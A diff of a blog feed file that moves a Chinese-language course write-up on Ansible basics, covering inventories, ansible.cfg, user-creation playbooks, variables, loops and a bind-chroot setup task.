-<p><a class="link"   href="https://docs.ansible.com/" >Official <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/By-XF2wX6.png"
-                      alt="image.png"
-                ></p>
-<h3 id="Yaml"><a href="#Yaml" class="headerlink" title="Yaml"></a>Yaml</h3><p><a href="/4KwXbbiGQd2tMdJVML-zxA">Re</a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/H1MBF2vQT.png"
-                      alt="image.png"
-                ></p>
-<h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><h4 id="名詞解釋"><a href="#名詞解釋" class="headerlink" title="名詞解釋"></a>名詞解釋</h4><ul>
-<li>inventory<ul>
-<li>host</li>
-<li>group</li>
-</ul>
-</li>
-<li>playbook<ul>
-<li>play</li>
-<li>task<ul>
-<li>modules</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="Requirement"><a href="#Requirement" class="headerlink" title="Requirement"></a>Requirement</h4><p>Linux , macos ,unix like host: <strong>need &gt;python3.5</strong></p>
-<h4 id="Inventory"><a href="#Inventory" class="headerlink" title="Inventory"></a>Inventory</h4><ul>
-<li>定義清單</li>
-</ul>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cd</span> /etc/ansible</span><br><span class="line"><span class="variable">$vim</span> hosts</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>INI or YAML</p>
-</blockquote>
-<ul>
-<li>群組</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[bind_server]</span><br><span class="line">servera.lab.example.com</span><br><span class="line">serverb.lab.example.com</span><br><span class="line">(server count)&gt;=0</span><br><span class="line">[web_server]</span><br><span class="line">.....</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li>巢狀群組</li>
-</ul>
-<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[usa]</span><br><span class="line">washington1.example.<span class="keyword">com</span></span><br><span class="line">washington2.example.<span class="keyword">com</span></span><br><span class="line">[canada]</span><br><span class="line">ontario01.example.<span class="keyword">com</span></span><br><span class="line">ontario02.example.<span class="keyword">com</span></span><br><span class="line">[north-americ<span class="variable">a:children</span>]</span><br><span class="line">canada</span><br><span class="line">usa</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="ansible-cfg"><a href="#ansible-cfg" class="headerlink" title="ansible.cfg"></a>ansible.cfg</h4><ul>
-<li><code>$vim ansible.cfg</code></li>
-</ul>
-<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">inventory = ./inventory</span><br><span class="line">remote user = devops</span><br><span class="line">ask_pass = false</span><br><span class="line"># $ssh-keygen</span><br><span class="line"># $ssh-<span class="keyword">copy</span>-id</span><br><span class="line">[privilege_escalation]</span><br><span class="line">become = true</span><br><span class="line">become method = sudo</span><br><span class="line">become_user = root</span><br><span class="line">become_ask_pass = true</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li>Show inventory</li>
-</ul>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cp</span> /etc/ansible/hosts inventory</span><br><span class="line"><span class="variable">$ansible</span>-navigator inventory -m stdout &lt;--list or --graph&gt;</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="Playbook-yml"><a href="#Playbook-yml" class="headerlink" title="Playbook.yml"></a>Playbook.yml</h4><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Adduser</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">username</span> <span class="string">is</span> <span class="string">chih</span> </span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">chih</span> </span><br><span class="line">        <span class="attr">uid:</span> <span class="number">8888</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br></pre></td></tr></table></figure></div>
-
-<h4 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ansible</span>-navigator run -m stdout playbook.yml</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="Ansible-simple-buildup"><a href="#Ansible-simple-buildup" class="headerlink" title="Ansible simple buildup"></a>Ansible simple buildup</h3><h4 id="Ansible-cfg-Inventory"><a href="#Ansible-cfg-Inventory" class="headerlink" title="Ansible.cfg &amp; Inventory"></a>Ansible.cfg &amp; Inventory</h4><ul>
-<li><code>$vim ansible.cfg</code></li>
-</ul>
-<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">inventory = ./inventory</span><br><span class="line">remote_user = devops</span><br><span class="line">ask_pass = false</span><br><span class="line"># $ssh-keygen</span><br><span class="line"># $ssh-<span class="keyword">copy</span>-id</span><br><span class="line">[privilege_escalation]</span><br><span class="line">become = true</span><br><span class="line">become_method = sudo</span><br><span class="line">become_user = root</span><br><span class="line">become_ask_pass = false</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>vim inventory</code></li>
-</ul>
-<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[bind_server]</span><br><span class="line">servera.lab.example.<span class="keyword">com</span></span><br><span class="line">serverb.lab.example.<span class="keyword">com</span></span><br><span class="line"></span><br><span class="line">[unbound_server]</span><br><span class="line">servverc.lab.example.<span class="keyword">com</span></span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>$ansible-navigator inventory --graph -m stdout</code></li>
-<li><code>$ansible-navigator exec --ansible -m ansible.builtin.user -a &#39;name=rcwang&#39; bind_server</code><ul>
-<li>ansibel.builtin.user -a : bliud user</li>
-<li>bind_server : In bind_server</li>
-</ul>
-</li>
-</ul>
-<h4 id="Playbook"><a href="#Playbook" class="headerlink" title="Playbook"></a>Playbook</h4><ul>
-<li><code>$vim newuser.yml</code></li>
-</ul>
-<div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">useradd</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">jjli</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">jjli</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span>  <span class="comment"># default</span></span><br><span class="line">        </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">hcyang</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">hcyang</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>$vim bind_server.yml</code></li>
-</ul>
-<div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># This file is setup by &lt;name&gt; at &lt;time&gt; for setting up &lt;server&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">bind-chroot</span> <span class="string">server</span> <span class="string">setup</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Step1.</span> <span class="string">Installation</span></span><br><span class="line">      <span class="attr">ansible.builtin.package:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">bind-chroot</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br><span class="line">    </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Step2.</span> <span class="string">First</span> <span class="string">Start</span></span><br><span class="line">      <span class="attr">ansible.builtin.service:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">named-chroot</span></span><br><span class="line">        <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></div>
-
-
-<h4 id="Other-parameter"><a href="#Other-parameter" class="headerlink" title="Other parameter"></a>Other parameter</h4><ul>
-<li>增加輸出的細部資訊<ul>
-<li><code>$ansibel-navigator run newuser.yml -m stdout -vvvv</code></li>
-</ul>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>選項v</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-v</td>
-<td>顯示任務結果。</td>
-</tr>
-<tr>
-<td>-vv</td>
-<td>任務結果和任務配置都會顯示</td>
-</tr>
-<tr>
-<td>-vvv</td>
-<td>包含關於與受管主機連接的資訊</td>
-</tr>
-<tr>
-<td>-vvvv</td>
-<td>增加了連接外掛程式相關的額外詳細程度選項，包括受管主機上用於執行腳本的用戶，以及所執行的腳本</td>
-</tr>
-</tbody></table>
-<ul>
-<li><code>$ansible-navigator run newuser.yml -m stdout --syntax-check</code><ul>
-<li>檢查語法錯誤 or 縮排</li>
-</ul>
-</li>
-</ul>
-<h3 id="Variable-Fact"><a href="#Variable-Fact" class="headerlink" title="Variable &amp; Fact"></a>Variable &amp; Fact</h3><h4 id="Playbook-variable"><a href="#Playbook-variable" class="headerlink" title="Playbook variable"></a>Playbook variable</h4><ul>
-<li><code>$vim newuser.yml</code><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">useradd</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">vars:</span> </span><br><span class="line">    <span class="attr">user1:</span> <span class="string">chiawei</span></span><br><span class="line">    <span class="attr">uid1:</span> <span class="number">5566</span></span><br><span class="line">  <span class="attr">vars_files:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">userlist.yml</span> <span class="comment">#</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;user1&#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;user1&#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">uid:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;uid1&#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span>  <span class="comment"># default</span></span><br><span class="line">        </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; user2 &#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; user2 &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">uid:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;uid2&#125;&#125;</span>&quot;</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></div></li>
-<li><code>$vim userlist.yml</code><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">user2:</span> <span class="string">fan</span></span><br><span class="line"><span class="attr">uid2:</span> <span class="number">1234</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-<h4 id="Host-group-variable"><a href="#Host-group-variable" class="headerlink" title="Host &amp; group variable"></a>Host &amp; group variable</h4><ul>
-<li><code>vim inventory</code></li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[bind_server]</span><br><span class="line">servera.lab.example.com ip4.addr=172.25.250.11 # Host variable</span><br><span class="line">serverb.lab.example.com ip4.addr=172.25.250.12</span><br><span class="line"></span><br><span class="line">[bind_server:vars] # group variable</span><br><span class="line">install_sodtware = bind-chroot</span><br><span class="line">service_name = named-chroot</span><br><span class="line"></span><br><span class="line">[unbound_server]</span><br><span class="line">servverc.lab.example.com</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>$mkdir group_vars host_vars</code></li>
-</ul>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$mkdir</span> group_vars </span><br><span class="line"><span class="variable">$mkdir</span> host_vars</span><br><span class="line"><span class="variable">$cd</span> group_vars</span><br><span class="line"><span class="variable">$vim</span> bind_server</span><br><span class="line"><span class="variable">$cd</span> ..</span><br><span class="line"><span class="variable">$cd</span> host_vars</span><br><span class="line"><span class="variable">$vim</span> servera.lab.example.com</span><br><span class="line"><span class="variable">$vim</span> serverb.lab.example.com</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>$vim bind_server</code></li>
-</ul>
-<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">install_software = bind-chroot</span><br><span class="line">service_name = named-chroot</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>$vim servera.lab.example.com</code></li>
-</ul>
-<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">ipv4_addr = 172.25.250.11</span><br></pre></td></tr></table></figure></div>
-<ul>
-<li><code>$vim serverb.lab.example.com</code></li>
-</ul>
-<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">ipv4_addr = 172.25.250.12</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li><code>$tree</code></li>
-</ul>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/HkTGL0wmT.png"
-                      alt="image.png"
-                ></p>
-<h4 id="Register"><a href="#Register" class="headerlink" title="Register"></a>Register</h4><ul>
-<li><p>register 語法可以取得命令輸出，並保存在一個臨時變數中</p>
-</li>
-<li><p><code>$vim newuser.yml</code></p>
-<div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Addusers</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">add</span> <span class="string">different</span> <span class="string">user</span> <span class="string">in</span> <span class="string">different</span> <span class="string">server</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;newuser_name&#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">register:</span> <span class="string">useradd_result</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Print</span> <span class="string">results</span></span><br><span class="line">      <span class="attr">ansible.builtin.debugg:</span></span><br><span class="line">        <span class="attr">var:</span> <span class="string">useradd_result</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p><code>$ansible-navigator run newuser.yml -m stdout</code></p>
-</li>
-</ul>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/S1Eos0wXT.png"
-                      alt="image.png"
-                ></p>
-<h4 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h4><h3 id="Task-control"><a href="#Task-control" class="headerlink" title="Task control"></a>Task control</h3><ul>
-<li><code>$vim user_add.yml</code><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">User</span> <span class="string">Management</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">serverd.lab.example.com</span></span><br><span class="line">  <span class="attr">vars:</span></span><br><span class="line">    <span class="attr">user_lists:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">hcyang</span> </span><br><span class="line">        <span class="attr">user_id:</span> <span class="number">1236</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">jjli</span> </span><br><span class="line">        <span class="attr">user_id:</span> <span class="number">1235</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> &#123;&#123; <span class="string">item.name</span> &#125;&#125; </span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; item.name &#125;&#125;</span>&quot;</span> </span><br><span class="line">        <span class="attr">uid:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; item.user_id &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br><span class="line">      <span class="attr">loop:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; user_lists &#125;&#125;</span>&quot;</span> </span><br><span class="line">      <span class="attr">register:</span> <span class="string">useradd_result</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">print</span> <span class="string">results</span> </span><br><span class="line">      <span class="attr">ansible.builtin.debug:</span></span><br><span class="line">        <span class="attr">msg:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        An user is add with name &#123;&#123; item.name &#125;&#125; </span></span><br><span class="line"><span class="string"></span>      <span class="attr">loop:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; useradd_result. results &#125;&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-<h2 id="期末考整理"><a href="#期末考整理" class="headerlink" title="期末考整理"></a>期末考整理</h2><p><code>DNS Http varnish database</code></p>
-<p><a class="link"   href="https://www.youtube.com/watch?v=VhXenrYuYcE" >DNS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link"   href="https://www.youtube.com/watch?v=0em4LrNN_v8" >HTTP_server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link"   href="https://www.youtube.com/watch?v=q14Aunuv9WU" >Https cerify ~1:10:00 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a class="link"   href="https://www.youtube.com/watch?v=q14Aunuv9WU" >Varnish and haproxy 1:10:00 ~  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><a href="">Database</a></p>
-]]></content>
-      <categories>
-        <category>csie</category>
-      </categories>
-      <tags>
-        <tag>csie</tag>
-        <tag>server</tag>
       </tags>
   </entry>
   <entry>
@@ -1880,6 +1641,245 @@
       </tags>
   </entry>
   <entry>
+    <title>NTTU 伺服器原理 WriteUp-2</title>
+    <url>/2024/08/09/server-1/</url>
+    <content><![CDATA[<h2 id="Ansible"><a href="#Ansible" class="headerlink" title="Ansible"></a>Ansible</h2><h3 id="Docs"><a href="#Docs" class="headerlink" title="Docs"></a>Docs</h3><ul>
+<li><code>$ansible-navigator doc -l</code></li>
+<li><code>ansible-navigator doc &lt;ansible.builtin.dnf&gt;</code></li>
+</ul>
+<p><a class="link"   href="https://docs.ansible.com/" >Official <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/By-XF2wX6.png"
+                      alt="image.png"
+                ></p>
+<h3 id="Yaml"><a href="#Yaml" class="headerlink" title="Yaml"></a>Yaml</h3><p><a href="/4KwXbbiGQd2tMdJVML-zxA">Re</a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/H1MBF2vQT.png"
+                      alt="image.png"
+                ></p>
+<h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><h4 id="名詞解釋"><a href="#名詞解釋" class="headerlink" title="名詞解釋"></a>名詞解釋</h4><ul>
+<li>inventory<ul>
+<li>host</li>
+<li>group</li>
+</ul>
+</li>
+<li>playbook<ul>
+<li>play</li>
+<li>task<ul>
+<li>modules</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="Requirement"><a href="#Requirement" class="headerlink" title="Requirement"></a>Requirement</h4><p>Linux , macos ,unix like host: <strong>need &gt;python3.5</strong></p>
+<h4 id="Inventory"><a href="#Inventory" class="headerlink" title="Inventory"></a>Inventory</h4><ul>
+<li>定義清單</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cd</span> /etc/ansible</span><br><span class="line"><span class="variable">$vim</span> hosts</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>INI or YAML</p>
+</blockquote>
+<ul>
+<li>群組</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[bind_server]</span><br><span class="line">servera.lab.example.com</span><br><span class="line">serverb.lab.example.com</span><br><span class="line">(server count)&gt;=0</span><br><span class="line">[web_server]</span><br><span class="line">.....</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>巢狀群組</li>
+</ul>
+<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[usa]</span><br><span class="line">washington1.example.<span class="keyword">com</span></span><br><span class="line">washington2.example.<span class="keyword">com</span></span><br><span class="line">[canada]</span><br><span class="line">ontario01.example.<span class="keyword">com</span></span><br><span class="line">ontario02.example.<span class="keyword">com</span></span><br><span class="line">[north-americ<span class="variable">a:children</span>]</span><br><span class="line">canada</span><br><span class="line">usa</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="ansible-cfg"><a href="#ansible-cfg" class="headerlink" title="ansible.cfg"></a>ansible.cfg</h4><ul>
+<li><code>$vim ansible.cfg</code></li>
+</ul>
+<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">inventory = ./inventory</span><br><span class="line">remote user = devops</span><br><span class="line">ask_pass = false</span><br><span class="line"># $ssh-keygen</span><br><span class="line"># $ssh-<span class="keyword">copy</span>-id</span><br><span class="line">[privilege_escalation]</span><br><span class="line">become = true</span><br><span class="line">become method = sudo</span><br><span class="line">become_user = root</span><br><span class="line">become_ask_pass = true</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>Show inventory</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cp</span> /etc/ansible/hosts inventory</span><br><span class="line"><span class="variable">$ansible</span>-navigator inventory -m stdout &lt;--list or --graph&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Playbook-yml"><a href="#Playbook-yml" class="headerlink" title="Playbook.yml"></a>Playbook.yml</h4><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Adduser</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">username</span> <span class="string">is</span> <span class="string">chih</span> </span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">chih</span> </span><br><span class="line">        <span class="attr">uid:</span> <span class="number">8888</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ansible</span>-navigator run -m stdout playbook.yml</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Ansible-simple-buildup"><a href="#Ansible-simple-buildup" class="headerlink" title="Ansible simple buildup"></a>Ansible simple buildup</h3><h4 id="Ansible-cfg-Inventory"><a href="#Ansible-cfg-Inventory" class="headerlink" title="Ansible.cfg &amp; Inventory"></a>Ansible.cfg &amp; Inventory</h4><ul>
+<li><code>$vim ansible.cfg</code></li>
+</ul>
+<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">inventory = ./inventory</span><br><span class="line">remote_user = devops</span><br><span class="line">ask_pass = false</span><br><span class="line"># $ssh-keygen</span><br><span class="line"># $ssh-<span class="keyword">copy</span>-id</span><br><span class="line">[privilege_escalation]</span><br><span class="line">become = true</span><br><span class="line">become_method = sudo</span><br><span class="line">become_user = root</span><br><span class="line">become_ask_pass = false</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>vim inventory</code></li>
+</ul>
+<div class="highlight-container" data-rel="Vim"><figure class="iseeu highlight vim"><table><tr><td class="code"><pre><span class="line">[bind_server]</span><br><span class="line">servera.lab.example.<span class="keyword">com</span></span><br><span class="line">serverb.lab.example.<span class="keyword">com</span></span><br><span class="line"></span><br><span class="line">[unbound_server]</span><br><span class="line">servverc.lab.example.<span class="keyword">com</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>$ansible-navigator inventory --graph -m stdout</code></li>
+<li><code>$ansible-navigator exec --ansible -m ansible.builtin.user -a &#39;name=rcwang&#39; bind_server</code><ul>
+<li>ansibel.builtin.user -a : bliud user</li>
+<li>bind_server : In bind_server</li>
+</ul>
+</li>
+</ul>
+<h4 id="Playbook"><a href="#Playbook" class="headerlink" title="Playbook"></a>Playbook</h4><ul>
+<li><code>$vim newuser.yml</code></li>
+</ul>
+<div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">useradd</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">jjli</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">jjli</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span>  <span class="comment"># default</span></span><br><span class="line">        </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">hcyang</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">hcyang</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>$vim bind_server.yml</code></li>
+</ul>
+<div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># This file is setup by &lt;name&gt; at &lt;time&gt; for setting up &lt;server&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">bind-chroot</span> <span class="string">server</span> <span class="string">setup</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Step1.</span> <span class="string">Installation</span></span><br><span class="line">      <span class="attr">ansible.builtin.package:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">bind-chroot</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br><span class="line">    </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Step2.</span> <span class="string">First</span> <span class="string">Start</span></span><br><span class="line">      <span class="attr">ansible.builtin.service:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">named-chroot</span></span><br><span class="line">        <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></div>
+
+
+<h4 id="Other-parameter"><a href="#Other-parameter" class="headerlink" title="Other parameter"></a>Other parameter</h4><ul>
+<li>增加輸出的細部資訊<ul>
+<li><code>$ansibel-navigator run newuser.yml -m stdout -vvvv</code></li>
+</ul>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>選項v</th>
+<th>描述</th>
+</tr>
+</thead>
